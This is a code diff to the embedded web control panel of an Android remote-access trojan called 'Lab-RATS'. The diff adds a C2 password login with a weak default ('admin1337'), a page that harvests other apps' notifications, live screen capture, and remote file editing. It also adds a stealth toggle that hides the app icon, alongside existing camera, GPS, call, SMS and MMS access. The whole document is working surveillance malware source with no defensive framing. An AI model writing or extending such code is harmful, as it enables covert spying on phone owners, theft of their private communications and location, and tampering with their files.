@@ -2,6 +2,7 @@ package com.labs.labrats;
 
 import android.Manifest;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.camera2.CameraManager;
@@ -87,6 +88,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  margin-bottom: 40px;" +
             "  position: relative;" +
             "  overflow: hidden;" +
+            "  background: transparent;" +
             "}" +
             ".header h1 {" +
             "  font-family: 'Orbitron', sans-serif;" +
@@ -219,7 +221,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".back-btn-container { margin-bottom: 25px; }" +
             ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 4px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
             ".btn-back:hover { background: var(--neon-cyan); color: var(--bg-dark); box-shadow: 0 0 15px var(--neon-cyan); }" +
-            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 90%; width: auto; z-index: 10000; opacity: 0.35; background: none; border: none; padding: 0; pointer-events: none; }" +
+            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 65%; width: auto; z-index: 10000; opacity: 0.35; pointer-events: none; }" +
             "</style>" +
             "</head>" +
             "<body>" +
@@ -238,6 +240,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "    <a href=\"/files\">Data</a>" +
             "    <a href=\"/camera\">Optics</a>" +
             "    <a href=\"/gps\">Locate</a>" +
+            "    <a href=\"/intel\">Intel</a>" +
             "    <a href=\"/calls\">Comms</a>" +
             "    <a href=\"/sms\">SMS</a>" +
             "    <a href=\"/mms\">MMS</a>" +
@@ -258,17 +261,59 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "</body>" +
             "</html>";
 
+    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>Lab-RATS | LOGIN</title>" +
+            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
+            "<style>" +
+            "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }" +
+            ".login-card { background: rgba(15,15,25,0.9); border: 1px solid #00f2ff; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 0 30px rgba(0,242,255,0.2); }" +
+            "input { background: #000; border: 1px solid #00f2ff; color: #fff; padding: 12px; margin: 20px 0; width: 100%; border-radius: 4px; outline: none; text-align: center; font-family: monospace; }" +
+            "button { background: transparent; border: 1px solid #00f2ff; color: #00f2ff; padding: 12px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }" +
+            "button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 20px #00f2ff; }" +
+            "</style></head><body>" +
+            "<div class=\"login-card\">" +
+            "<h1>ACCESS_RESTRICTED</h1>" +
+            "<form action=\"/login\" method=\"POST\">" +
+            "<input type=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
+            "<br><button type=\"submit\">UPLINK</button>" +
+            "</form></div></body></html>";
+
+    private String sessionToken = "";
+
     public LabRatsHttpServer(Context context, int port) {
         super(port);
         this.context = context;
+        // Generate a random token on start
+        this.sessionToken = java.util.UUID.randomUUID().toString();
     }
 
     @Override
     public Response serve(IHTTPSession session) {
         String uri = session.getUri();
-        Map<String, String> params = session.getParms();
-
+        
         try {
+            if (uri.equals("/login")) {
+                Map<String, String> files = new HashMap<>();
+                session.parseBody(files);
+                Map<String, String> postParams = session.getParms();
+                String pass = postParams.get("password");
+                
+                if (getStoredPassword().equals(pass)) {
+                    Response r = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
+                    r.addHeader("Location", "/");
+                    r.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly");
+                    return r;
+                }
+                return newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML.replace("ACCESS_RESTRICTED", "INVALID_CREDENTIALS"));
+            }
+
+            // Auth Check
+            String cookie = session.getCookies().read("token");
+            if (cookie == null || !cookie.equals(sessionToken)) {
+                return newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML);
+            }
+
+            Map<String, String> params = session.getParms();
+
             if (uri.equals("/") || uri.isEmpty()) {
                 return serveHome();
             } else if (uri.equals("/logo")) {
@@ -313,12 +358,28 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 return stopVideoRecording();
             } else if (uri.equals("/camera/status")) {
                 return serveCameraStatus();
+            } else if (uri.equals("/camera/screen-frame")) {
+                return serveScreenFrame();
+            } else if (uri.equals("/camera/screen-start")) {
+                return startScreenProjection();
             } else if (uri.equals("/camera/flash")) {
                 return triggerFlash();
             } else if (uri.equals("/gps")) {
                 return serveGpsPage();
             } else if (uri.equals("/gps/locate")) {
                 return serveGpsLocate(params);
+            } else if (uri.equals("/intel")) {
+                return serveIntel();
+            } else if (uri.startsWith("/files/edit/")) {
+                return serveFileEdit(uri.substring(12));
+            } else if (uri.equals("/files/save")) {
+                return saveFile(session);
+            } else if (uri.equals("/camera/night-mode")) {
+                return toggleNightMode();
+            } else if (uri.equals("/stealth")) {
+                return toggleStealthMode();
+            } else if (uri.equals("/settings/password")) {
+                return updatePassword(session);
             } else if (uri.startsWith("/download/")) {
                 return serveDownload(uri);
             } else if (uri.equals("/audio")) {
@@ -439,19 +500,47 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
         html.append("</div>");
 
+        // Security Settings Card
+        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-orange);\">");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-orange);\">SECURITY_PROTOCOL_UPGRADE</h3>");
+        html.append("<div style=\"margin-top: 15px;\">");
+        html.append("<form action=\"/settings/password\" method=\"POST\" style=\"display: flex; gap: 10px; align-items: center; flex-wrap: wrap;\">");
+        html.append("<input type=\"password\" name=\"new_password\" placeholder=\"NEW_ACCESS_KEY\" style=\"background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 10px; border-radius: 4px; outline: none; font-family: monospace; flex-grow: 1; min-width: 200px;\">");
+        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); padding: 10px 20px; font-size: 0.7rem;\">UPDATE_KEY</button>");
+        html.append("</form>");
+        html.append("</div>");
+        html.append("</div>");
+
         html.append(HTML_FOOTER);
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 
     private Response serveDeviceInfo() {
-        String html = HTML_HEADER +
-                "<div class=\"card\">" +
-                "<h2 style=\"margin-bottom: 20px;\">Device Information</h2>" +
-                DeviceInfo.getDeviceInfoHtml(context) +
-                "</div>" +
-                HTML_FOOTER;
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">Device Information</h2>");
+        html.append(DeviceInfo.getDeviceInfoHtml(context));
+        html.append("</div>");
+        
+        html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
+        html.append("<h2 style=\"color: var(--neon-orange);\">STEALTH_OPERATIONS</h2>");
+        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage app visibility and persistence. WARNING: Hiding the icon requires the dial-pad trigger to recover.</p>");
+        
+        html.append("<div style=\"display: flex; gap: 15px;\">");
+        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">TOGGLE_APP_ICON_STEALTH</button>");
+        html.append("</div>");
+        
+        html.append("<script>");
+        html.append("function toggleStealth() {");
+        html.append("  if(confirm('Are you sure? This will hide the app from the drawer. Use *#1337# to recover.')) {");
+        html.append("    fetch('/stealth').then(r => r.json()).then(d => alert('Stealth status changed. Hidden: ' + d.hidden));");
+        html.append("  }");
+        html.append("}");
+        html.append("</script>");
+        html.append("</div>");
 
-        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 
     private Response serveFiles(String uri, Map<String, String> params) {
@@ -541,6 +630,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 html.append("</div></div>");
 
                 if (file.isFile()) {
+                    String lowerName = fileName.toLowerCase();
+                    if (lowerName.endsWith(".txt") || lowerName.endsWith(".json") || lowerName.endsWith(".log") || 
+                        lowerName.endsWith(".xml") || lowerName.endsWith(".html") || lowerName.endsWith(".js") || lowerName.endsWith(".css")) {
+                        html.append("<a class=\"btn btn-small\" style=\"margin-right:8px; border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
+                    }
                     html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath)
                             .append("\">FETCH</a>");
                 }
@@ -1283,7 +1377,28 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Camera</h2>");
+        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px;\">")
+            .append("<span style=\"color:var(--neon-cyan);\">&#128247;</span> OPTICS_TERMINAL")
+            .append("<span id=\"night-mode-status\" style=\"margin-left:auto; font-size:0.7rem; color:").append(CameraService.isNightModeEnabled() ? "var(--neon-green)" : "var(--neon-red)").append("; font-family:monospace;\">NIGHT_MODE: ").append(CameraService.isNightModeEnabled() ? "ACTIVE" : "OFF").append("</span>")
+            .append("</h2>");
+
+        html.append("<div style=\"padding:15px; margin-bottom:20px; display:flex; justify-content:center; align-items:center; border:1px solid rgba(255,255,0,0.1); border-radius:12px; background:rgba(255,255,0,0.02);\">")
+            .append("<button onclick=\"toggleNightMode()\" id=\"night-btn\" class=\"btn\" style=\"padding:10px 20px; border-color:var(--neon-yellow); color:var(--neon-yellow); background:rgba(255,255,0,0.05); font-size:0.8rem;\">")
+            .append("&#127769; TOGGLE NIGHT VISION")
+            .append("</button>")
+            .append("<script>")
+            .append("function toggleNightMode() {")
+            .append("  fetch('/camera/night-mode').then(r => r.json()).then(data => {")
+            .append("    const status = document.getElementById('night-mode-status');")
+            .append("    if(data.nightMode) {")
+            .append("      status.innerText = 'NIGHT_MODE: ACTIVE'; status.style.color = 'var(--neon-green)';")
+            .append("    } else {")
+            .append("      status.innerText = 'NIGHT_MODE: OFF'; status.style.color = 'var(--neon-red)';")
+            .append("    }")
+            .append("  });")
+            .append("}")
+            .append("</script>")
+            .append("</div>");
 
         // Check permission
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -1412,6 +1527,41 @@ public class LabRatsHttpServer extends NanoHTTPD {
             html.append("setInterval(checkRecStatus, 2000);");
             html.append("</script>");
 
+            html.append("</div>");
+
+            // Screen Projection Section
+            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
+            html.append("<h3 style=\"color: var(--neon-cyan); margin-bottom: 15px;\">&#128241; Remote Screen Projection</h3>");
+            html.append("<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Stream the live device screen (Requires user consent on phone)</p>");
+            
+            html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
+            html.append("<div id=\"screen-container\" style=\"position: relative; display: inline-block; background: #000; border: 1px solid var(--neon-cyan); border-radius: 10px; overflow: hidden; min-height: 200px; width: 300px;\">");
+            html.append("<img id=\"screen-stream\" src=\"\" style=\"max-width: 100%; height: auto; display: block;\" />");
+            html.append("<div id=\"screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #888;\">OFFLINE</div>");
+            html.append("</div></div>");
+
+            html.append("<div style=\"display: flex; gap: 10px; justify-content: center;\">");
+            html.append("<button onclick=\"startScreen()\" class=\"btn\">START_PROJECTION</button>");
+            html.append("<button onclick=\"stopScreen()\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger);\">STOP</button>");
+            html.append("</div>");
+
+            html.append("<script>");
+            html.append("var screenActive = false;");
+            html.append("function startScreen() {");
+            html.append("  fetch('/camera/screen-start').then(r => r.json()).then(d => {");
+            html.append("    screenActive = true; document.getElementById('screen-status').innerHTML = 'WAITING_FOR_CONSENT...';");
+            html.append("    refreshScreen();");
+            html.append("  });");
+            html.append("}");
+            html.append("function stopScreen() { screenActive = false; document.getElementById('screen-status').innerHTML = 'OFFLINE'; document.getElementById('screen-stream').src = ''; }");
+            html.append("function refreshScreen() {");
+            html.append("  if (!screenActive) return;");
+            html.append("  const img = document.getElementById('screen-stream');");
+            html.append("  img.src = '/camera/screen-frame?t=' + Date.now();");
+            html.append("  img.onload = () => { document.getElementById('screen-status').style.display = 'none'; };");
+            html.append("  setTimeout(refreshScreen, 1000);");
+            html.append("}");
+            html.append("</script>");
             html.append("</div>");
         }
 
@@ -1967,10 +2117,34 @@ public class LabRatsHttpServer extends NanoHTTPD {
         String videoPath = CameraService.getCurrentVideoPath();
 
         String json = String.format(
-                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
+                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s, \"screenShare\": %s}",
                 streaming, recording, currentCamera, duration,
-                videoPath != null ? "\"" + videoPath + "\"" : "null");
+                videoPath != null ? "\"" + videoPath + "\"" : "null",
+                ScreenShareService.isStreaming());
         return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    private Response serveScreenFrame() {
+        byte[] frame = ScreenShareService.getNextFrame();
+        if (frame != null && frame.length > 0) {
+            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
+            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
+            response.addHeader("Cache-Control", "no-cache");
+            return response;
+        }
+        return serveSingleFrame(); // Fallback to black pixel
+    }
+
+    private Response startScreenProjection() {
+        try {
+            Intent intent = new Intent(context, MainActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            intent.putExtra("trigger", "screen_capture");
+            context.startActivity(intent);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Consent prompt sent to device\"}");
+        } catch (Exception e) {
+            return serveError("Projection Error: " + e.getMessage());
+        }
     }
 
     // ============ AUDIO/MICROPHONE RECORDING ============
@@ -2703,5 +2877,153 @@ public class LabRatsHttpServer extends NanoHTTPD {
         } catch (Exception e) {
             return serveError("MMS Dispatch Error: " + e.getMessage());
         }
+    }
+
+    private Response serveIntel() {
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<h2 style=\"display:flex; align-items:center; gap:15px;\">")
+            .append("<span style=\"color:var(--neon-cyan);\">&#9889;</span> INTEL_STREAM")
+            .append("<span style=\"margin-left:auto; font-size:0.7rem; opacity:0.5; font-family:monospace;\">NOTIFICATION_LISTENER_ACTIVE</span>")
+            .append("</h2>");
+
+        html.append("<div class=\"card\">");
+        List<NotificationSniffer.NotificationData> notifications = NotificationSniffer.getHistory();
+
+        if (notifications.isEmpty()) {
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128225;</div><p>No active intel stream. Waiting for device notifications...</p></div>");
+        } else {
+            html.append("<table id=\"intel-table\">")
+                .append("<thead><tr><th>Source</th><th>Payload</th><th>Uplink_Time</th></tr></thead>")
+                .append("<tbody>");
+
+            for (NotificationSniffer.NotificationData n : notifications) {
+                String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
+                html.append("<tr>")
+                    .append("<td style=\"color:var(--neon-green); font-weight:bold;\">").append(escapeHtml(n.packageName)).append("</td>")
+                    .append("<td>")
+                    .append("<div style=\"color:#fff; font-weight:bold; margin-bottom:4px;\">").append(escapeHtml(n.title)).append("</div>")
+                    .append("<div style=\"font-size:0.8rem; opacity:0.8;\">").append(escapeHtml(n.text)).append("</div>")
+                    .append("</td>")
+                    .append("<td style=\"font-family:monospace; opacity:0.6;\">").append(time).append("</td>")
+                    .append("</tr>");
+            }
+            html.append("</tbody></table>");
+        }
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveFileEdit(String path) {
+        path = path.replace("%20", " ");
+        File file = new File(Environment.getExternalStorageDirectory(), path);
+        if (!file.exists() || !file.isFile()) return serve404();
+
+        StringBuilder content = new StringBuilder();
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                content.append(line).append("\n");
+            }
+        } catch (Exception e) {
+            return serveError("Failed to read file: " + e.getMessage());
+        }
+
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\"><a href=\"/files/").append(file.getParentFile().getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), ""))
+            .append("\" class=\"btn-back\">&#8592; Back to Directory</a></div>");
+        
+        html.append("<h2><span style=\"color:var(--neon-orange);\">&#9998;</span> EDIT_CORE_DATA: ").append(file.getName()).append("</h2>");
+        html.append("<div class=\"card\" style=\"padding:20px;\">");
+        html.append("<form action=\"/files/save\" method=\"POST\">")
+            .append("<input type=\"hidden\" name=\"path\" value=\"").append(escapeHtml(path)).append("\">")
+            .append("<textarea name=\"content\" style=\"width:100%; height:500px; background:#000; color:var(--terminal-green); border:1px solid rgba(0,242,255,0.2); border-radius:8px; padding:15px; font-family:'JetBrains Mono',monospace; font-size:0.9rem; resize:vertical; outline:none;\" spellcheck=\"false\">")
+            .append(escapeHtml(content.toString()))
+            .append("</textarea>")
+            .append("<div style=\"margin-top:20px; display:flex; justify-content:flex-end; gap:15px;\">")
+            .append("<button type=\"submit\" class=\"btn\">DEPLOY_CHANGES</button>")
+            .append("</div>")
+            .append("</form>");
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response saveFile(IHTTPSession session) {
+        try {
+            Map<String, String> files = new HashMap<>();
+            session.parseBody(files);
+            Map<String, String> params = session.getParms();
+            
+            String path = params.get("path");
+            String content = params.get("content");
+            
+            if (path == null) return serveError("Path is missing");
+            File file = new File(Environment.getExternalStorageDirectory(), path);
+            
+            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(file)) {
+                fos.write(content.getBytes());
+            }
+            
+            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><p>Changes deployed successfully to storage.</p><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div>" + HTML_FOOTER;
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        } catch (Exception e) {
+            return serveError("Save Failed: " + e.getMessage());
+        }
+    }
+
+    private Response toggleNightMode() {
+        CameraService service = CameraService.getInstance();
+        if (service != null) {
+            boolean current = CameraService.isNightModeEnabled();
+            service.setNightMode(!current);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + !current + "}");
+        }
+        return serveError("Camera Service Inactive");
+    }
+
+    private Response toggleStealthMode() {
+        try {
+            android.content.ComponentName aliasName = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
+            int setting = context.getPackageManager().getComponentEnabledSetting(aliasName);
+            int newSetting = (setting == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) 
+                ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
+                : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+            
+            context.getPackageManager().setComponentEnabledSetting(aliasName, newSetting, android.content.pm.PackageManager.DONT_KILL_APP);
+            
+            boolean hidden = (newSetting == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": " + hidden + "}");
+        } catch (Exception e) {
+            return serveError("Stealth Error: " + e.getMessage());
+        }
+    }
+
+    private Response updatePassword(IHTTPSession session) {
+        try {
+            Map<String, String> files = new HashMap<>();
+            session.parseBody(files);
+            Map<String, String> params = session.getParms();
+            String newPass = params.get("new_password");
+
+            if (newPass == null || newPass.trim().isEmpty()) {
+                return serveError("Invalid password");
+            }
+
+            context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
+                    .edit()
+                    .putString("c2_password", newPass.trim())
+                    .apply();
+
+            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><p>New security protocol active. You will need to use this key for future uplinks.</p><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        } catch (Exception e) {
+            return serveError("Failed to update password: " + e.getMessage());
+        }
+    }
+
+    private String getStoredPassword() {
+        return context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
+                .getString("c2_password", "admin1337");
     }
 }
